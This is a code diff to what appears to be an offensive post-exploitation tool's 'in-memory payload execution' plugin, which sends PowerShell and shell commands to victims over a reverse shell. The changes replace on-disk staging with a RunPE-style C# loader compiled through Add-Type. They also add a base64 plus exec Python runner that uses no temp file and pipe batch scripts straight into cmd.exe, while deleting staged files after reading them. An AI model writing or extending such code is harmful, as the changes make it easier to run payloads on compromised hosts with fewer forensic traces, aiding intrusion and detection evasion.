@@ -1,5 +1,6 @@
 """Cross-platform in-memory payload execution plugin."""
 
+import base64
 import json
 import os
 import re
@@ -23,6 +24,10 @@ from ...constants import (
 )
 from ...sysinfo import _b64_exec_cmd
 from ..api import plugin, SessionContext
+
+_WIN_PE_LOADER_CS = os.path.join(os.path.dirname(__file__), '_win_pe_loader.cs')
+with open(_WIN_PE_LOADER_CS, 'rb') as _pe_loader_fh:
+    _WIN_PE_LOADER_B64 = base64.b64encode(_pe_loader_fh.read()).decode('ascii')
 
 INMEMORY_USAGE = (
     'run inmemory <filetype> <local_file> [-- args] [--save-output <file>]\n'
@@ -255,41 +260,33 @@ except Exception as exc:
 print('{EXEC_MARK_START}' + json.dumps(result) + '{EXEC_MARK_END}', end='')
 """
         if shell_type == 'windows':
-            ps_path = self._escape_for_ps(path)
-            win_ps = f"""
-$p='{ps_path}';$expected='{expected_hash}'
-$result=@{{stdout='';stderr='';exit_code=0;method='python-exec'}}
-try {{
-  $bytes=[IO.File]::ReadAllBytes($p)
-  Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
-  $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
-  if($hash -ne $expected) {{ $result.exit_code=1; $result.stderr='SHA256 verification failed' }}
-  else {{
-    $code=[Text.Encoding]::UTF8.GetString($bytes)
-    $tmp=[IO.Path]::GetTempFileName()+'.py'
-    [IO.File]::WriteAllText($tmp,$code)
-    $psi=New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName='python'
-    $psi.Arguments='"' + $tmp + '"'
-    $psi.UseShellExecute=$false
-    $psi.RedirectStandardOutput=$true
-    $psi.RedirectStandardError=$true
-    $proc=[Diagnostics.Process]::Start($psi)
-    if(-not $proc) {{ $psi.FileName='python3'; $proc=[Diagnostics.Process]::Start($psi) }}
-    $result.stdout=$proc.StandardOutput.ReadToEnd()
-    $result.stderr=$proc.StandardError.ReadToEnd()
-    $proc.WaitForExit()
-    $result.exit_code=$proc.ExitCode
-    Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-  }}
-}} catch {{ $result.exit_code=1; $result.stderr=$_.Exception.Message }}
-'{EXEC_MARK_START}'+($result|ConvertTo-Json -Compress)+'{EXEC_MARK_END}'
-"""
-            return None, win_ps.strip()
+            return None, self._build_win_python_runner_ps(py_body)
         return _b64_exec_cmd(py_body, (
             ('python3', 'python'),
             ('python', 'python'),
         )), None
+
+    def _build_win_python_runner_ps(self, py_body):
+        """Run the Python runner in-process via python -c (no payload temp file)."""
+        payload = base64.b64encode(py_body.strip().encode('utf-8')).decode('ascii')
+        fail = json.dumps({
+            'stdout': '', 'stderr': 'Python not found', 'exit_code': 1, 'method': 'python-exec',
+        })
+        mark_s = EXEC_MARK_START
+        mark_e = EXEC_MARK_END
+        return f"""
+$ErrorActionPreference='Continue'
+$b64='{payload}'
+$ran=$false
+foreach($py in @('python','python3')){{
+  if(Get-Command $py -ErrorAction SilentlyContinue){{
+    & $py -c "import base64; exec(base64.b64decode('$b64'))"
+    $ran=$true
+    break
+  }}
+}}
+if(-not $ran){{Write-Output '{mark_s}{fail}{mark_e}'}}
+""".strip()
 
     def _build_powershell_exec(self, remote_path, expected_hash):
         path = self._escape_for_ps(self.h._escape_path(remote_path, 'windows'))
@@ -331,7 +328,6 @@ try {{
 """
 
     def _build_pe_exec(self, remote_path, expected_hash, payload_args, shell_type):
-        args_json = self._json_escape(payload_args)
         path = self._escape_for_ps(self.h._escape_path(remote_path, shell_type))
         mark_s = EXEC_MARK_START
         mark_e = EXEC_MARK_END
@@ -339,13 +335,22 @@ try {{
         if shell_type != 'windows':
             return None, None
 
-        arg_list = ', '.join(f"'{self._escape_for_ps(str(a))}'" for a in payload_args)
-        ps_args = f"@({arg_list})" if payload_args else '@()'
+        if payload_args:
+            arg_parts = []
+            for arg in payload_args:
+                text = str(arg)
+                if re.search(r'\s', text):
+                    arg_parts.append('"' + text.replace('"', '`"') + '"')
+                else:
+                    arg_parts.append(text)
+            arg_line = self._escape_for_ps(' '.join(arg_parts))
+        else:
+            arg_line = ''
 
+        loader_b64 = _WIN_PE_LOADER_B64
         runpe_ps = f"""
-$p='{path}';$expected='{expected_hash}';$payloadArgs={ps_args}
-$result=@{{stdout='';stderr='';exit_code=0;method='pe-memory-staged'}}
-$tmp=$null
+$p='{path}';$expected='{expected_hash}';$argLine='{arg_line}'
+$result=@{{stdout='';stderr='';exit_code=0;method='pe-runpe'}}
 try {{
   if(-not (Test-Path -LiteralPath $p)) {{ throw "Staging file not found: $p" }}
   $bytes=[IO.File]::ReadAllBytes($p)
@@ -355,37 +360,23 @@ try {{
     $result.exit_code=1
     $result.stderr='SHA256 verification failed'
   }} else {{
-    $tmp=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
-    [IO.File]::WriteAllBytes($tmp,$bytes)
-    $bytes=$null
-    $psi=New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName=$tmp
-    $psi.UseShellExecute=$false
-    $psi.RedirectStandardOutput=$true
-    $psi.RedirectStandardError=$true
-    $psi.CreateNoWindow=$true
-    if($payloadArgs.Count -gt 0) {{
-      $argLine=($payloadArgs | ForEach-Object {{
-        $a=$_.ToString()
-        if($a -match '\\s') {{ '"' + ($a.Replace('"','`"')) + '"' }} else {{ $a }}
-      }}) -join ' '
-      $psi.Arguments=$argLine
+    $cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{loader_b64}'))
+    try {{ Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop }} catch {{
+      if($_.Exception.Message -notmatch 'already exists|Cannot add type') {{ throw }}
     }}
-    $proc=[Diagnostics.Process]::Start($psi)
-    if(-not $proc) {{ throw 'Process.Start returned null' }}
-    $result.stdout=$proc.StandardOutput.ReadToEnd()
-    $result.stderr=$proc.StandardError.ReadToEnd()
-    $proc.WaitForExit()
-    if(-not $proc.HasExited) {{ $proc.Kill(); $result.stderr+=' [process killed after timeout]' }}
-    $result.exit_code=$proc.ExitCode
+    $exec=[PeMemoryLoader]::Execute($bytes, $argLine)
+    if($exec.Error) {{
+      $result.exit_code=1
+      $result.stderr=$exec.Error
+    }} else {{
+      $result.stdout=$exec.StdOut
+      $result.stderr=$exec.StdErr
+      $result.exit_code=$exec.ExitCode
+    }}
   }}
 }} catch {{
   $result.exit_code=1
   $result.stderr=$_.Exception.Message
-}} finally {{
-  if($tmp -and (Test-Path -LiteralPath $tmp)) {{
-    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
-  }}
 }}
 '{mark_s}'+($result | ConvertTo-Json -Compress -Depth 4)+'{mark_e}'
 """
@@ -496,14 +487,38 @@ try {{
   Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue
   $hash=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLower()
   if($hash -ne $expected) {{ throw 'SHA256 verification failed' }}
-  $tmp=Join-Path $env:TEMP ([IO.Path]::GetRandomFileName()+'.bat')
-  try {{
-    [IO.File]::WriteAllBytes($tmp,$bytes)
-    & cmd.exe /c "`"$tmp`"" 2>&1
-    Write-Output "`n[exit:$LASTEXITCODE]"
-  }} finally {{
-    if(Test-Path -LiteralPath $tmp) {{ Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue }}
+  $text=[Text.Encoding]::Default.GetString($bytes)
+  $bytes=$null
+  $psi=New-Object System.Diagnostics.ProcessStartInfo
+  $psi.FileName='cmd.exe'
+  $psi.Arguments='/Q'
+  $psi.UseShellExecute=$false
+  $psi.RedirectStandardInput=$true
+  $psi.RedirectStandardOutput=$true
+  $psi.RedirectStandardError=$true
+  $psi.CreateNoWindow=$true
+  $proc=[Diagnostics.Process]::Start($psi)
+  if(-not $proc) {{ throw 'Process.Start returned null' }}
+  $proc.StandardInput.Write($text)
+  $proc.StandardInput.Close()
+  $text=$null
+  while($true) {{
+    $emitted=$false
+    while($proc.StandardOutput.Peek() -ge 0) {{
+      Write-Output $proc.StandardOutput.ReadLine()
+      $emitted=$true
+    }}
+    while($proc.StandardError.Peek() -ge 0) {{
+      Write-Output $proc.StandardError.ReadLine()
+      $emitted=$true
+    }}
+    if($proc.HasExited) {{ break }}
+    if(-not $emitted) {{ Start-Sleep -Milliseconds 100 }}
   }}
+  while($proc.StandardOutput.Peek() -ge 0) {{ Write-Output $proc.StandardOutput.ReadLine() }}
+  while($proc.StandardError.Peek() -ge 0) {{ Write-Output $proc.StandardError.ReadLine() }}
+  $proc.WaitForExit()
+  Write-Output "`n[exit:$($proc.ExitCode)]"
 }} catch {{
   Write-Output $_.Exception.Message
   Write-Output "`n[exit:1]"
@@ -514,11 +529,15 @@ try {{
         self.h._flush_shell(client_sock, timeout=1.0)
         if shell_type == 'windows' and win_ps:
             cmd = self.h._win_ps_cmd(win_ps)
+            if cmd:
+                sent = self.h.send_to_revshell(client_sock, cmd)
+            else:
+                sent = self.h._send_win_ps(client_sock, win_ps)
         elif unix_cmd:
-            cmd = unix_cmd
+            sent = self.h.send_to_revshell(client_sock, unix_cmd)
         else:
             return ''
-        if not self.h.send_to_revshell(client_sock, cmd):
+        if not sent:
             return ''
         deadline = time.time() + timeout
         last_data = time.time()
@@ -657,15 +676,21 @@ try {{
         return result
 
     def _run_exec_command(self, client_sock, unix_cmd, win_ps, shell_type, timeout=120.0):
+        def _send_win_script(script):
+            cmd = self.h._win_ps_cmd(script)
+            if cmd:
+                return self.h.send_to_revshell(client_sock, cmd)
+            return self.h._send_win_ps(client_sock, script)
+
         def _attempt(use_win):
             self.h._flush_shell(client_sock)
             if use_win and win_ps:
-                cmd = self.h._win_ps_cmd(win_ps)
+                if not _send_win_script(win_ps):
+                    return None
             elif unix_cmd:
-                cmd = unix_cmd
+                if not self.h.send_to_revshell(client_sock, unix_cmd):
+                    return None
             else:
-                return None
-            if not self.h.send_to_revshell(client_sock, cmd):
                 return None
             output = self.h.recv_output(client_sock, timeout=timeout, until_marker=EXEC_MARK_END)
             parsed, trailing = self._extract_exec_output(output)
